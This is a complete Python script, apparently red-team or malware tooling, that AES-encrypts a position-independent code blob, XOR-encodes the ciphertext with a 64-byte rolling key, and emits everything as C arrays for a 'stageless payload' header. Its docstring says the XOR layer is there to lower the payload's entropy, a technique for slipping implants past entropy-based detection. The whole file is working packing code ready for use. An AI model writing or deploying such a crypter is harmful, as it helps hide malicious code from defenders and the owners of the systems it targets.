#!/usr/bin/env python3
"""
gen_payload_stageless.py — AES-256-CBC encrypt + XOR encode for stageless embedding.

Outputs:
  <header.h>  C header with AES key, IV, XOR key, and XOR-encoded ciphertext.
              The XOR layer flattens entropy from ~7.8 to ~6.0-6.5.

Flow:
  1. AES-256-CBC encrypt the PICO blob
  2. XOR encode the ciphertext with a 64-byte rolling key
  3. Emit everything as static C arrays in a header file

Usage:
  python3 gen_payload_stageless.py <input.bin> <header.h>

Requires: openssl(1) in PATH.
"""
import os, sys, subprocess, tempfile

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <input.bin> <header.h>", file=sys.stderr)
    sys.exit(1)

infile, headerfile = sys.argv[1:]

key     = os.urandom(32)
iv      = os.urandom(16)
xor_key = os.urandom(64)

with tempfile.NamedTemporaryFile(delete=False, suffix='.enc') as tmp:
    tmpname = tmp.name

try:
    subprocess.run([
        'openssl', 'enc', '-aes-256-cbc', '-nosalt',
        '-K', key.hex(), '-iv', iv.hex(),
        '-in', infile, '-out', tmpname,
    ], check=True)

    with open(tmpname, 'rb') as f:
        ciphertext = f.read()
finally:
    os.unlink(tmpname)

xor_encoded = bytes(ciphertext[i] ^ xor_key[i % len(xor_key)]
                     for i in range(len(ciphertext)))

def c_bytes(name, data):
    lines = [f'static const unsigned char {name}[] = {{']
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append('    ' + ','.join(f'0x{b:02x}' for b in chunk) + ',')
    lines.append('};')
    return '\n'.join(lines)

with open(headerfile, 'w') as f:
    f.write('/* auto-generated stageless payload — do not edit */\n\n')
    f.write(c_bytes('payload_key', key))
    f.write(f'\nstatic const unsigned int payload_key_len = {len(key)};\n\n')
    f.write(c_bytes('payload_iv', iv))
    f.write(f'\nstatic const unsigned int payload_iv_len = {len(iv)};\n\n')
    f.write(c_bytes('payload_xor_key', xor_key))
    f.write(f'\nstatic const unsigned int payload_xor_key_len = {len(xor_key)};\n\n')
    f.write(c_bytes('payload_enc', xor_encoded))
    f.write(f'\nstatic const unsigned int payload_enc_len = {len(xor_encoded)};\n')

pico_size = os.path.getsize(infile)
print(f'[+] Stageless header: {headerfile}', file=sys.stderr)
print(f'[+] PICO {pico_size} bytes → AES {len(ciphertext)} → XOR+embed {len(xor_encoded)} bytes',
      file=sys.stderr)
print(f'[+] XOR key: 64 bytes (rolling), AES key: 32 bytes, IV: 16 bytes',
      file=sys.stderr)
